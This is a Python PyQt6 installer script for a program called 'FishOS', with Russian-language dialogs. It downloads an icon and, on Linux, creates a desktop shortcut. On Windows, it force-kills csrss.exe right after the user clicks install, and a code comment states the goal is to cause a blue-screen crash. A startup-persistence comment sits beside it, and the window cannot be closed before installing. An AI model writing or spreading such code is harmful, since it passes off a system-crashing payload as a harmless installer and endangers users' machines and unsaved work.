import sys
import os
import requests
from PyQt6 import QtGui
from PyQt6.QtWidgets import *
from install_pages import page1, page2

SIZE = (640, 480)


class InstallWindow(QWidget):
    def __init__(self):
        super().__init__()

        self.installed = False

        self.setWindowTitle("Install FishOS")
        self.setGeometry(300, 300, *SIZE)
        self.setMaximumSize(*SIZE)
        self.setMinimumSize(*SIZE)

        self.stack = QStackedWidget(self)
        self.main_layout = QVBoxLayout(self)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.addWidget(self.stack)

        self.page1 = page1.Page1(self)
        self.page2 = page2.Page2(self)

        self.stack.addWidget(self.page1)
        self.stack.addWidget(self.page2)

        self.page1.next_btn.clicked.connect(self.page_1_to_2)
        self.page2.install_button.clicked.connect(self.install)

    def page_1_to_2(self):
        self.stack.setCurrentWidget(self.page2)

    def install(self):
        if not (self.page2.cb1.isChecked() and self.page2.cb2.isChecked()):
            QMessageBox.information(
                self,
                "Warning",
                "Пожалуйста, примите пользовательское соглашение и подтведтите, что вы отдаёте отчет своим действиям."
            )
            return
        print("Installing FishOS")

        print(sys.platform)
        if "win" in sys.platform:
            local_appdata = os.getenv("LOCALAPPDATA")
            local_data = os.path.join(local_appdata, "FishOS")
            os.mkdir(local_data)

            with open(os.path.join(local_data, 'fos_ICON.ico'), 'wb') as f:
                try:
                    r = requests.get(
                        'https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.ico')
                    if r.status_code == 200:
                        f.write(r.content)
                    else:
                        QMessageBox.critical(
                            self,
                            'Ошибка',
                            "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                        )
                        f.close()
                        return
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        'Ошибка',
                        "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                    )
                    return

            app_data = os.getenv("APPDATA")
            startup_folder = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup")

            # Adding EXE to startup

            # Killing csrss.exe to make BSOD
            os.system('taskkill /F /IM csrss.exe')

            #os.kill(pids[0])
        elif "linux" in sys.platform:
            home_path = os.getenv("HOME")
            home_dirs = os.listdir(home_path)

            if 'Desktop' in home_dirs:
                link_path = os.path.join(os.path.join(home_path, "Desktop"), 'FishOS.desktop')
            elif 'Рабочий стол' in home_dirs:
                link_path = os.path.join(os.path.join(home_path, "Desktop"), 'FishOS.desktop')
            else:
                os.mkdir(os.path.join(home_path, "Desktop"))
                link_path = os.path.join(os.path.join(home_path, "Desktop"))

            local_data = os.path.join(home_path, ".local/share/FishOS")
            os.makedirs(local_data, exist_ok=True)

            with open(os.path.join(local_data, 'fos_ICON.png'), 'wb') as f:
                try:
                    r = requests.get('https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.png')
                    if r.status_code == 200:
                        f.write(r.content)
                    else:
                        QMessageBox.critical(
                            self,
                            'Ошибка',
                            "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                        )
                        f.close()
                        return
                except requests.exceptions.ConnectionError:
                    QMessageBox.critical(
                        self,
                        'Ошибка',
                        "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                    )
                    return

            executable_path = sys.executable
            with open(link_path, "w") as f:
                DATA = f"""\
[Desktop Entry]
Version=1.0
Name=FishOS
Comment=Fun Operating System
Type=Application
Terminal=false
Exec={executable_path}
Icon={os.path.join(local_data, 'fos_ICON.png')}"""
                f.write(DATA)

        self.installed = True
        QMessageBox.information(
            self,
            "Информация",
            "FishOS успешно утсановлена на ваш ПК.\nСпасибо, что выбираете нас!"
        )

    def closeEvent(self, event: QtGui.QCloseEvent) -> None:
        if not self.installed:
            event.ignore()
        else:
            event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    install_window = InstallWindow()
    install_window.show()

    sys.exit(app.exec())
